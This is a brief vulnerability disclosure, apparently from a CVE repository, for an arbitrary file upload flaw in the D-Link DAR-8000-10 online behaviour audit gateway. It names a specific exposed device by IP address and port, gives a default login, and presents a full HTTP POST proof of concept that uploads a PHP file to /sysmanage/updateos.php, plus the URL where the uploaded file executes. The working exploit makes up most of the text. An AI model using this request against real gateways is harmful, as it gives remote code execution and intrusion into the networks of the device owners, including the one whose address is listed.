The full version of the D-LINK DAR-8000-10 series online behavior audit gateway has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-8000-10

Vulnerability Path ：/sysmanage/updateos.php

Ip：https://59.60.19.174:8443/

Log in to the system using the default password：test/admin@123

POC：
```
POST /sysmanage/updateos.php? HTTP/1.1
Host: 
Cookie: PHPSESSID=405fd5b19bc87f221050608ff53b6fb9
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 597
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_file_upload"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

set
-----------------------------42328904123665875270630079328—
```

<img width="722" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/dd44ef4c-f4ed-40f2-8af6-3cee38efcb6a">

https://59.60.19.174:8443/home/1.php 

<img width="727" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/532db13e-c9f3-41f1-ad45-d48f25c797af">

